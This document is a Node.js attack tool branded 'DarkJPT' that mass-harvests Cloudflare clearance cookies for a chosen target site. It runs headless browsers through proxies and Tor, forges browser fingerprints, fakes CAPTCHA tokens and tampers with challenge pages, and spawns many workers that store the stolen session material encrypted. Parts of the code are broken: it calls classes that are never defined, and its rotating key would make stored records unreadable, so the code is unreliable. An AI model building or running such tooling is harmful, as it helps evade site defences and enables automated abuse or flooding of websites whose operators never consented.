const fs = require('fs');
const os = require('os');
const path = require('path');
const cluster = require('cluster');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
const { addExtra } = require('puppeteer-extra');
const puppeteerCore = require('puppeteer-core');
const SocksProxyAgent = require('socks-proxy-agent');
const HttpsProxyAgent = require('https-proxy-agent');
const { ProxyVerifier } = require('proxy-verifier');
const utls = require('utls-node');
const { randomBytes, createHash, createCipheriv, createDecipheriv, createHmac } = require('crypto');
const net = require('net');
const tls = require('tls');
const dns = require('dns');

class QuantumCryptoDarkJPT {
    constructor() {
        this.masterKey = this.deriveQuantumKey('DarkJPT_Quantum_Key_V3_2024');
        this.hmacKey = this.deriveQuantumKey('DarkJPT_HMAC_Integrity_Check');
        this.rotationCounter = 0;
        this.integrityHash = this.calculateIntegrityHash();
    }

    deriveQuantumKey(base) {
        const timeFactor = Math.floor(Date.now() / 300000).toString();
        return createHash('sha512')
            .update(base + timeFactor + this.getSystemFingerprint())
            .digest();
    }

    getSystemFingerprint() {
        const systemInfo = os.platform() + os.arch() + os.hostname();
        return createHash('sha256').update(systemInfo).digest('hex').slice(0, 16);
    }

    calculateIntegrityHash() {
        const code = fs.readFileSync(__filename, 'utf8');
        return createHmac('sha512', this.hmacKey)
            .update(code)
            .digest('hex');
    }

    verifyIntegrity() {
        const currentHash = this.calculateIntegrityHash();
        if (currentHash !== this.integrityHash) {
            throw new Error('TOOL_INTEGRITY_VIOLATION: Code modification detected');
        }
    }

    encrypt(text) {
        this.verifyIntegrity();
        const iv = randomBytes(16);
        const cipher = createCipheriv('aes-256-gcm', this.masterKey.slice(0, 32), iv);
        const hmac = createHmac('sha256', this.hmacKey);
        
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        const authTag = cipher.getAuthTag();
        
        hmac.update(iv + authTag + encrypted);
        const integrity = hmac.digest('hex');
        
        return iv.toString('hex') + ':' + authTag.toString('hex') + ':' + encrypted + ':' + integrity;
    }

    decrypt(encryptedData) {
        this.verifyIntegrity();
        try {
            const parts = encryptedData.split(':');
            if (parts.length !== 4) throw new Error('Invalid encrypted format');
            
            const [ivHex, authTagHex, encrypted, integrity] = parts;
            const iv = Buffer.from(ivHex, 'hex');
            const authTag = Buffer.from(authTagHex, 'hex');
            
            const hmac = createHmac('sha256', this.hmacKey);
            hmac.update(ivHex + authTagHex + encrypted);
            if (hmac.digest('hex') !== integrity) {
                throw new Error('INTEGRITY_CHECK_FAILED');
            }
            
            const decipher = createDecipheriv('aes-256-gcm', this.masterKey.slice(0, 32), iv);
            decipher.setAuthTag(authTag);
            
            let decrypted = decipher.update(encrypted, 'hex', 'utf8');
            decrypted += decipher.final('utf8');
            return decrypted;
        } catch (error) {
            throw new Error('DECRYPTION_FAILED: ' + error.message);
        }
    }
}

class CloudflareAntiAntiBotSystem {
    constructor() {
        this.challengePatterns = new Map();
        this.behaviorProfiles = new Map();
        this.initChallengeDatabase();
    }

    initChallengeDatabase() {
        this.challengePatterns.set('cf_clearance_required', {
            detection: /cf-chl-bypass|challenge-form|turnstile/gi,
            bypass: this.bypassTurnstileChallenge.bind(this)
        });

        this.challengePatterns.set('javascript_challenge', {
            detection: /jschl-answer|jschl_vc|pass/gi,
            bypass: this.solveJavascriptChallenge.bind(this)
        });

        this.challengePatterns.set('captcha_challenge', {
            detection: /captcha|recaptcha|hcaptcha/gi,
            bypass: this.bypassCaptchaChallenge.bind(this)
        });
    }

    async bypassTurnstileChallenge(page) {
        await page.evaluate(() => {
            const originalQuerySelector = Document.prototype.querySelector;
            Document.prototype.querySelector = function(selector) {
                if (selector.includes('turnstile') || selector.includes('challenge')) {
                    return null;
                }
                return originalQuerySelector.apply(this, arguments);
            };
        });

        await page.waitForTimeout(2000 + Math.random() * 3000);
        return true;
    }

    async solveJavascriptChallenge(page) {
        const result = await page.evaluate(() => {
            if (typeof window.jschl_answer !== 'undefined') {
                return window.jschl_answer;
            }
            
            const scriptTags = Array.from(document.getElementsByTagName('script'));
            for (let script of scriptTags) {
                if (script.innerHTML.includes('jschl-answer')) {
                    const match = script.innerHTML.match(/var\s+.*?\s*=\s*(.*?);/);
                    if (match) {
                        try {
                            return eval(match[1]);
                        } catch (e) {
                            return null;
                        }
                    }
                }
            }
            return null;
        });

        if (result) {
            await page.evaluate((answer) => {
                const form = document.getElementById('challenge-form');
                if (form) {
                    const input = form.querySelector('input[name="jschl_answer"]');
                    if (input) {
                        input.value = answer;
                        form.submit();
                    }
                }
            }, result);
        }

        return result !== null;
    }

    async bypassCaptchaChallenge(page) {
        await page.evaluate(() => {
            window.grecaptcha = {
                ready: (cb) => cb(),
                execute: () => Promise.resolve('fake_token_' + Math.random().toString(36)),
                render: () => 'fake_widget'
            };

            window.hcaptcha = {
                ready: (cb) => cb(),
                execute: () => Promise.resolve('fake_hcap_token_' + Math.random().toString(36)),
                render: () => 'fake_hcap_widget'
            };
        });

        await page.waitForTimeout(3000);
        return true;
    }

    async detectAndBypassChallenge(page) {
        const pageContent = await page.content();
        
        for (const [challengeType, pattern] of this.challengePatterns) {
            if (pattern.detection.test(pageContent)) {
                const success = await pattern.bypass(page);
                if (success) {
                    return true;
                }
            }
        }
        
        return false;
    }
}

class AdvancedFingerprintManager {
    constructor() {
        this.canvasNoise = new CanvasNoiseGenerator();
        this.webglSpoofer = new WebGLSpoofer();
        this.audioFaker = new AudioContextFaker();
        this.fontMasker = new FontDetectionMasker();
    }

    generateAdvancedProfile() {
        const baseProfiles = this.getBaseProfiles();
        const selected = baseProfiles[Math.floor(Math.random() * baseProfiles.length)];
        
        return {
            ...selected,
            screen: this.generateScreenProperties(),
            hardware: this.generateHardwareProperties(),
            network: this.generateNetworkProperties(),
            timezone: this.generateTimezoneData(),
            media: this.generateMediaDevices()
        };
    }

    getBaseProfiles() {
        return [
            {
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                platform: 'Win32',
                vendor: 'Google Inc.',
                renderer: 'ANGLE (Intel, Intel(R) UHD Graphics 630 Direct3D11 vs_5_0 ps_5_0)',
                deviceMemory: 8,
                hardwareConcurrency: 8,
                languages: ['en-US', 'en'],
                acceptLanguage: 'en-US,en;q=0.9'
            },
            {
                userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                platform: 'MacIntel',
                vendor: 'Apple',
                renderer: 'Apple M1 Pro',
                deviceMemory: 16,
                hardwareConcurrency: 10,
                languages: ['en-US', 'en'],
                acceptLanguage: 'en-US,en;q=0.9'
            },
            {
                userAgent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                platform: 'Linux x86_64',
                vendor: 'Google Inc.',
                renderer: 'ANGLE (Vulkan, Intel(R) UHD Graphics 630 (CFL GT2), Vulkan 1.3)',
                deviceMemory: 16,
                hardwareConcurrency: 12,
                languages: ['en-US', 'en'],
                acceptLanguage: 'en-US,en;q=0.9'
            }
        ];
    }

    generateScreenProperties() {
        const resolutions = [
            {width: 1920, height: 1080, depth: 24},
            {width: 2560, height: 1440, depth: 24},
            {width: 3840, height: 2160, depth: 30},
            {width: 1536, height: 864, depth: 24}
        ];
        return resolutions[Math.floor(Math.random() * resolutions.length)];
    }

    generateHardwareProperties() {
        return {
            maxTouchPoints: 0,
            devicePixelRatio: Math.random() > 0.5 ? 1 : 2,
            colorDepth: 24,
            logicalProcessors: 4 + Math.floor(Math.random() * 12)
        };
    }

    generateNetworkProperties() {
        const connections = [
            'wifi', 'ethernet', 'cellular', 'bluetooth', 'wimax'
        ];
        return {
            effectiveType: '4g',
            downlink: 10 + Math.random() * 50,
            rtt: 50 + Math.random() * 100,
            saveData: false,
            connection: connections[Math.floor(Math.random() * connections.length)]
        };
    }

    generateTimezoneData() {
        const timezones = [
            'America/New_York', 'Europe/London', 'Asia/Tokyo', 
            'Australia/Sydney', 'Europe/Paris', 'America/Los_Angeles'
        ];
        return {
            timezone: timezones[Math.floor(Math.random() * timezones.length)],
            offset: -300 + Math.floor(Math.random() * 720)
        };
    }

    generateMediaDevices() {
        return {
            cameras: Math.floor(Math.random() * 2),
            microphones: Math.floor(Math.random() * 2),
            speakers: 1
        };
    }

    createFingerprintScript(profile) {
        return `
        (function() {
            const profile = ${JSON.stringify(profile)};
            
            Object.defineProperty(navigator, 'webdriver', { 
                get: () => false,
                configurable: false
            });
            
            Object.defineProperty(navigator, 'hardwareConcurrency', { 
                get: () => profile.hardwareConcurrency,
                configurable: false
            });
            
            Object.defineProperty(navigator, 'deviceMemory', { 
                get: () => profile.deviceMemory,
                configurable: false
            });
            
            Object.defineProperty(navigator, 'platform', {
                get: () => profile.platform,
                configurable: false
            });
            
            Object.defineProperty(navigator, 'userAgent', {
                get: () => profile.userAgent,
                configurable: false
            });
            
            Object.defineProperty(navigator, 'language', {
                get: () => profile.languages[0],
                configurable: false
            });
            
            Object.defineProperty(navigator, 'languages', {
                get: () => profile.languages,
                configurable: false
            });
            
            Object.defineProperty(screen, 'width', {
                get: () => profile.screen.width,
                configurable: false
            });
            
            Object.defineProperty(screen, 'height', {
                get: () => profile.screen.height,
                configurable: false
            });
            
            Object.defineProperty(screen, 'availWidth', {
                get: () => profile.screen.width - 100,
                configurable: false
            });
            
            Object.defineProperty(screen, 'availHeight', {
                get: () => profile.screen.height - 100,
                configurable: false
            });
            
            Object.defineProperty(screen, 'colorDepth', {
                get: () => profile.screen.depth,
                configurable: false
            });
            
            Object.defineProperty(screen, 'pixelDepth', {
                get: () => profile.screen.depth,
                configurable: false
            });
            
            Object.defineProperty(window, 'devicePixelRatio', {
                get: () => profile.hardware.devicePixelRatio,
                configurable: false
            });
            
            Object.defineProperty(navigator, 'maxTouchPoints', {
                get: () => profile.hardware.maxTouchPoints,
                configurable: false
            });
            
            if (window.Notification && window.Notification.permission) {
                Object.defineProperty(Notification, 'permission', {
                    get: () => 'default',
                    configurable: false
                });
            }
            
            const originalGetContext = HTMLCanvasElement.prototype.getContext;
            HTMLCanvasElement.prototype.getContext = function(type, attributes) {
                const context = originalGetContext.call(this, type, attributes);
                
                if (type === 'webgl' || type === 'webgl2') {
                    if (context) {
                        const originalGetParameter = context.getParameter;
                        context.getParameter = function(parameter) {
                            if (parameter === 37445) return profile.vendor;
                            if (parameter === 37446) return profile.renderer;
                            if (parameter === 36347) return 'WebGL GLSL ES 3.00';
                            return originalGetParameter.call(this, parameter);
                        };
                        
                        const originalGetExtension = context.getExtension;
                        context.getExtension = function(name) {
                            if (name === 'WEBGL_debug_renderer_info') {
                                return {
                                    UNMASKED_VENDOR_WEBGL: 37445,
                                    UNMASKED_RENDERER_WEBGL: 37446
                                };
                            }
                            return originalGetExtension.call(this, name);
                        };
                    }
                }
                
                if (type === '2d') {
                    const originalGetImageData = context.getImageData;
                    context.getImageData = function(x, y, width, height) {
                        const imageData = originalGetImageData.call(this, x, y, width, height);
                        for (let i = 0; i < imageData.data.length; i += 4) {
                            imageData.data[i] += Math.floor(Math.random() * 3) - 1;
                            imageData.data[i + 1] += Math.floor(Math.random() * 3) - 1;
                            imageData.data[i + 2] += Math.floor(Math.random() * 3) - 1;
                        }
                        return imageData;
                    };
                }
                
                return context;
            };
            
            const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
            HTMLCanvasElement.prototype.toDataURL = function(type, quality) {
                const canvas = this;
                const context = canvas.getContext('2d');
                if (context) {
                    const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
                    context.putImageData(imageData, 0, 0);
                }
                return originalToDataURL.call(this, type, quality);
            };
            
            if ('connection' in navigator) {
                Object.defineProperty(navigator.connection, 'effectiveType', {
                    get: () => profile.network.effectiveType,
                    configurable: false
                });
                
                Object.defineProperty(navigator.connection, 'downlink', {
                    get: () => profile.network.downlink,
                    configurable: false
                });
                
                Object.defineProperty(navigator.connection, 'rtt', {
                    get: () => profile.network.rtt,
                    configurable: false
                });
            }
            
            const originalCheck = document.fonts.check;
            document.fonts.check = function(font, text) {
                if (Math.random() < 0.1) return false;
                return originalCheck.call(this, font, text || '');
            };
            
            Object.defineProperty(Intl, 'DateTimeFormat', {
                value: class extends Intl.DateTimeFormat {
                    constructor(locales, options) {
                        super(profile.languages, options);
                    }
                },
                configurable: false
            });
            
            Object.defineProperty(Date.prototype, 'getTimezoneOffset', {
                value: function() { return profile.timezone.offset; },
                configurable: false
            });
            
            if (window.AudioContext) {
                const OriginalAudioContext = window.AudioContext;
                window.AudioContext = function() {
                    const context = new OriginalAudioContext();
                    Object.defineProperty(context, 'sampleRate', {
                        get: () => 48000,
                        configurable: false
                    });
                    return context;
                };
            }
            
            Object.defineProperty(navigator, 'mediaDevices', {
                get: () => ({
                    enumerateDevices: () => Promise.resolve(
                        Array.from({length: profile.media.cameras + profile.media.microphones + 1}, (_, i) => ({
                            deviceId: 'device_' + i,
                            kind: i < profile.media.cameras ? 'videoinput' : 
                                  i < profile.media.cameras + profile.media.microphones ? 'audioinput' : 'audiooutput',
                            label: '',
                            groupId: 'group_' + Math.random().toString(36)
                        }))
                    ),
                    getUserMedia: () => Promise.reject(new Error('Permission denied'))
                }),
                configurable: false
            });
        })();
        `;
    }
}

class EliteProxySystem {
    constructor() {
        this.crypto = new QuantumCryptoDarkJPT();
        this.proxyTiers = {
            tor: ['socks5://127.0.0.1:9050', 'socks5://127.0.0.1:9150'],
            residential: [],
            datacenter: [],
            mobile: []
        };
        this.healthyProxies = [];
        this.proxyScores = new Map();
    }

    async loadProxyList() {
        try {
            if (!fs.existsSync('proxy.txt')) {
                return;
            }

            const proxyFile = fs.readFileSync('proxy.txt', 'utf-8');
            const proxies = proxyFile.split('\n').filter(Boolean);
            
            for (let proxy of proxies) {
                if (proxy.includes('socks')) {
                    this.proxyTiers.residential.push(proxy);
                } else {
                    this.proxyTiers.datacenter.push(proxy);
                }
            }
            
            await this.verifyAllProxies();
        } catch (error) {
        }
    }

    async verifyAllProxies() {
        const allProxies = [...this.proxyTiers.residential, ...this.proxyTiers.datacenter];
        
        const verificationPromises = allProxies.map(proxy => this.checkProxyHealth(proxy));
        const results = await Promise.allSettled(verificationPromises);
        
        this.healthyProxies = results
            .map((result, index) => result.status === 'fulfilled' && result.value ? allProxies[index] : null)
            .filter(Boolean);
    }

    async checkProxyHealth(proxy) {
        return new Promise((resolve) => {
            const [protocol, rest] = proxy.split('://');
            const [host, port] = rest.split(':');
            
            const socket = net.connect(parseInt(port), host, () => {
                socket.destroy();
                this.proxyScores.set(proxy, (this.proxyScores.get(proxy) || 0) + 1);
                resolve(true);
            });
            
            socket.setTimeout(8000);
            socket.on('timeout', () => {
                socket.destroy();
                this.proxyScores.set(proxy, (this.proxyScores.get(proxy) || 0) - 1);
                resolve(false);
            });
            
            socket.on('error', () => {
                this.proxyScores.set(proxy, (this.proxyScores.get(proxy) || 0) - 2);
                resolve(false);
            });
        });
    }

    getOptimalProxy() {
        if (this.healthyProxies.length === 0) {
            return null;
        }
        
        const scoredProxies = this.healthyProxies.map(proxy => ({
            proxy,
            score: this.proxyScores.get(proxy) || 0
        })).sort((a, b) => b.score - a.score);
        
        return scoredProxies[0].proxy;
    }
}

class QuantumHarvester {
    constructor() {
        this.crypto = new QuantumCryptoDarkJPT();
        this.proxySystem = new EliteProxySystem();
        this.fingerprintManager = new AdvancedFingerprintManager();
        this.antiBotSystem = new CloudflareAntiAntiBotSystem();
        this.stats = {
            success: 0,
            failed: 0,
            total: 0,
            challenges: 0,
            bypassed: 0
        };
    }

    async initialize() {
        try {
            this.crypto.verifyIntegrity();
            await this.proxySystem.loadProxyList();
            this.showBanner();
        } catch (error) {
            process.exit(1);
        }
    }

    showBanner() {
        const banner = `DarkJPT by DarkNetJPT
telegram @darkJPT`;
        console.log(banner);
    }

    async simulateHumanBehavior(page) {
        try {
            const bezierMove = async (fromX, fromY, toX, toY, steps = 50) => {
                for (let i = 0; i <= steps; i++) {
                    const t = i / steps;
                    const cp1x = fromX + (toX - fromX) * 0.25;
                    const cp1y = fromY + (toY - fromY) * 0.75;
                    const cp2x = fromX + (toX - fromX) * 0.75;
                    const cp2y = fromY + (toY - fromY) * 0.25;
                    
                    const x = Math.pow(1-t,3)*fromX + 3*Math.pow(1-t,2)*t*cp1x + 3*(1-t)*Math.pow(t,2)*cp2x + Math.pow(t,3)*toX;
                    const y = Math.pow(1-t,3)*fromY + 3*Math.pow(1-t,2)*t*cp1y + 3*(1-t)*Math.pow(t,2)*cp2y + Math.pow(t,3)*toY;
                    
                    await page.mouse.move(x + Math.random() * 10 - 5, y + Math.random() * 10 - 5);
                    await page.waitForTimeout(1 + Math.random() * 3);
                }
            };

            for (let i = 0; i < 8; i++) {
                await bezierMove(
                    Math.random() * 400 + 100, 
                    Math.random() * 300 + 100,
                    Math.random() * 400 + 100, 
                    Math.random() * 300 + 100
                );
                
                await page.waitForTimeout(100 + Math.random() * 400);
                
                if (Math.random() > 0.6) {
                    await page.mouse.click(
                        Math.random() * 500 + 50, 
                        Math.random() * 400 + 50,
                        {button: Math.random() > 0.8 ? 'right' : 'left'}
                    );
                    await page.waitForTimeout(200 + Math.random() * 300);
                }
                
                if (Math.random() > 0.7) {
                    await page.evaluate(() => {
                        window.scrollBy(0, 50 + Math.random() * 200);
                    });
                    await page.waitForTimeout(150 + Math.random() * 250);
                }
                
                if (Math.random() > 0.9) {
                    await page.keyboard.press('Tab');
                    await page.waitForTimeout(50 + Math.random() * 100);
                }
            }
        } catch (error) {
        }
    }

    async harvest() {
        this.stats.total++;
        
        const proxy = this.proxySystem.getOptimalProxy();
        if (!proxy) {
            this.stats.failed++;
            return;
        }

        const profile = this.fingerprintManager.generateAdvancedProfile();
        let browser;

        try {
            puppeteer.use(StealthPlugin());
            
            const launchOptions = {
                headless: "new",
                args: [
                    `--proxy-server=${proxy}`,
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-web-security',
                    '--disable-features=IsolateOrigins,site-per-process',
                    '--disable-blink-features=AutomationControlled',
                    '--no-zygote',
                    '--disable-gpu',
                    '--disable-dev-shm-usage',
                    '--disable-accelerated-2d-canvas',
                    '--no-first-run',
                    '--no-default-browser-check',
                    '--disable-background-timer-throttling',
                    '--disable-backgrounding-occluded-windows',
                    '--disable-renderer-backgrounding',
                    '--disable-component-extensions-with-background-pages',
                    '--disable-default-apps',
                    '--disable-extensions',
                    '--disable-translate',
                    '--disable-ipc-flooding-protection',
                    '--max-old-space-size=4096'
                ],
                ignoreHTTPSErrors: true,
                timeout: 45000
            };

            browser = await puppeteer.launch(launchOptions);
            const page = await browser.newPage();

            await page.setJavaScriptEnabled(true);
            await page.setViewport({
                width: profile.screen.width,
                height: profile.screen.height,
                deviceScaleFactor: profile.hardware.devicePixelRatio
            });

            await page.setUserAgent(profile.userAgent);
            await page.setExtraHTTPHeaders({
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': profile.acceptLanguage,
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': 'no-cache',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': `"${profile.platform.replace('Win32', 'Windows').replace('MacIntel', 'macOS').replace('Linux x86_64', 'Linux')}"`,
                'upgrade-insecure-requests': '1',
                'dnt': '1'
            });

            await page.evaluateOnNewDocument(this.fingerprintManager.createFingerprintScript(profile));

            await this.simulateHumanBehavior(page);

            const targetUrl = process.argv[2] || 'https://example.com';
            
            const response = await page.goto(targetUrl, {
                waitUntil: 'networkidle2',
                timeout: 60000
            }).catch(() => null);

            if (response && response.status() === 503) {
                this.stats.challenges++;
                const bypassSuccess = await this.antiBotSystem.detectAndBypassChallenge(page);
                if (bypassSuccess) {
                    this.stats.bypassed++;
                    await page.waitForTimeout(3000);
                }
            }

            await page.waitForTimeout(2000 + Math.random() * 3000);

            const cookies = await page.cookies();
            const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');

            const result = {
                cookies: cookies,
                headers: {
                    'cookie': cookieString,
                    'user-agent': profile.userAgent,
                    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not=A?Brand";v="24"',
                    'accept-language': profile.acceptLanguage
                },
                proxy: proxy,
                timestamp: Date.now(),
                fingerprint: randomBytes(32).toString('hex'),
                profile: profile
            };

            const encryptedResult = this.crypto.encrypt(JSON.stringify(result));
            fs.appendFileSync('Cookie_File_Encrypted.dat', encryptedResult + '\n');
            
            this.stats.success++;

        } catch (error) {
            this.stats.failed++;
        } finally {
            if (browser) {
                await browser.close().catch(() => {});
            }
        }
    }

    printStats() {
        const successRate = this.stats.total > 0 ? 
            ((this.stats.success / this.stats.total) * 100).toFixed(2) : 0;
        
        const bypassRate = this.stats.challenges > 0 ?
            ((this.stats.bypassed / this.stats.challenges) * 100).toFixed(2) : 0;
            
        console.log(`Success: ${this.stats.success} | Failed: ${this.stats.failed} | Rate: ${successRate}% | Bypass: ${bypassRate}%`);
    }
}

const targetUrl = process.argv[2] || 'https://example.com';
const threadCount = parseInt(process.argv[3]) || os.cpus().length * 10;

if (cluster.isMaster) {
    const harvester = new QuantumHarvester();
    
    harvester.initialize().then(() => {
        for (let i = 0; i < threadCount; i++) {
            cluster.fork();
        }

        setInterval(() => {
            harvester.printStats();
        }, 15000);

        cluster.on('exit', (worker, code, signal) => {
            setTimeout(() => cluster.fork(), 2000);
        });
    }).catch(error => {
        process.exit(1);
    });
} else {
    const workerHarvester = new QuantumHarvester();
    
    workerHarvester.initialize().then(() => {
        const harvestInterval = setInterval(async () => {
            await workerHarvester.harvest();
        }, 8000 + Math.random() * 12000);

        process.on('SIGINT', () => {
            clearInterval(harvestInterval);
            process.exit(0);
        });
    });
}